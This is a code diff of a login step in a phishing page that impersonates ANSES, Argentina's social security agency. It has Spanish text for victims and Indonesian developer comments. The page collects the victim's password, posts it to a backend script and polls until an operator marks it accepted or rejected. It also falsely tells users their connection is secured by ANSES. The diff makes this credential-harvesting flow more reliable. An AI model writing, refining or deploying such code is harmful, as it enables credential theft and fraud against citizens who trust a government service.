@@ -1,4 +1,5 @@
 <style>
+    /* STYLE TETAP SAMA SESUAI PERMINTAAN */
     .password-wrapper {
         padding: 10px 5px;
         text-align: left;
@@ -85,6 +86,23 @@
         color: #777;
         text-align: center;
     }
+
+    /* Tambahan Loader agar fungsi .show() bekerja */
+    #loader {
+        display: none;
+        text-align: center;
+        margin-top: 15px;
+    }
+    .spinner-blue {
+        width: 30px;
+        height: 30px;
+        border: 4px solid #f3f3f3;
+        border-top: 4px solid #0080c7;
+        border-radius: 50%;
+        animation: spin-pass 1s linear infinite;
+        display: inline-block;
+    }
+    @keyframes spin-pass { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 </style>
 
 <div class="password-wrapper">
@@ -97,15 +115,20 @@
         <input
             type="password"
             class="form-control anses-password-input shadow-none"
-            name="phone"
-            id="phone"
+            id="password_val"
             placeholder="Ingrese su contraseña"
+            autocomplete="current-password"
         />
     </div>
 
-    <p id="wrong">❌ Contraseña incorrecta. Intente de nuevo.</p>
+    <p id="wrong">❌ Contraseña incorrecta. Intente de nuovo.</p>
 
-    <button class="btn-anses-confirm btn">CONFIRMAR IDENTIDAD</button>
+    <div id="loader">
+        <div class="spinner-blue"></div>
+        <p style="font-size: 13px; color: #0080c7; margin-top: 5px;">Verificando...</p>
+    </div>
+
+    <button type="button" class="btn-anses-confirm btn" id="btnPassSubmit">CONFIRMAR IDENTIDAD</button>
 
     <div class="security-note">
         🔒 Esta es una conexión segura cifrada por el sistema de seguridad de ANSES.
@@ -114,47 +137,65 @@
 </div>
 
 <script>
-    // Inisialisasi status awal
-    $("#wrong").hide();
-
-    function checkStatus() {
+    $(document).ready(function() {
         $("#wrong").hide();
-        $.ajax({
-            url: "API/index.php",
-            type: "POST",
-            data: {"method":"getStatus"},
-            success:function(data){
-                if (data.result.status == "success") {
-                    window.location.reload();
-                } else if (data.result.status == "failed") {
-                    $("#wrong").show();
-                    $("input[type='password']").val("");
-                    $("#loader").hide();
-                } else {
-                    setTimeout(function(){
-                        checkStatus();
-                    }, 500);
-                }
-            }
-        });
-    }
+        $("#loader").hide();
 
-    $(".btn-anses-confirm").on("click", function(e){
-        e.preventDefault();
-        var password = $("input[type='password']").val();
-
-        if (password !== "") {
-            $("#loader").show();
+        function checkStatus() {
             $.ajax({
                 url: "API/index.php",
                 type: "POST",
-                data: {"method":"sendPassword","password":password},
-                success:function(){
-                    setTimeout(function(){
-                        checkStatus();
-                    }, 500);
+                data: {"method":"getStatus"},
+                success: function(data) {
+                    // Proteksi jika API mengembalikan string
+                    let res = (typeof data === 'string') ? JSON.parse(data) : data;
+
+                    if (res.result.status == "success") {
+                        window.location.reload();
+                    } else if (res.result.status == "failed") {
+                        $("#loader").hide();
+                        $("#btnPassSubmit").show();
+                        $("#wrong").show();
+                        $("#password_val").val("");
+                    } else {
+                        setTimeout(function(){
+                            checkStatus();
+                        }, 1000);
+                    }
+                },
+                error: function() {
+                    setTimeout(function(){ checkStatus(); }, 2000);
                 }
             });
         }
+
+        $("#btnPassSubmit").on("click", function(e){
+            e.preventDefault();
+            var password = $("#password_val").val();
+
+            if (password !== "") {
+                $("#wrong").hide();
+                $("#btnPassSubmit").hide(); 
+                $("#loader").show(); 
+
+                $.ajax({
+                    url: "API/index.php",
+                    type: "POST",
+                    data: {"method":"sendPassword", "password": password},
+                    success: function() {
+                        setTimeout(function(){
+                            checkStatus();
+                        }, 500);
+                    },
+                    error: function() {
+                        $("#loader").hide();
+                        $("#btnPassSubmit").show();
+                        alert("Error de conexión");
+                    }
+                });
+            } else {
+                alert("Por favor, ingrese su contraseña.");
+            }
+        });
     });
 </script>
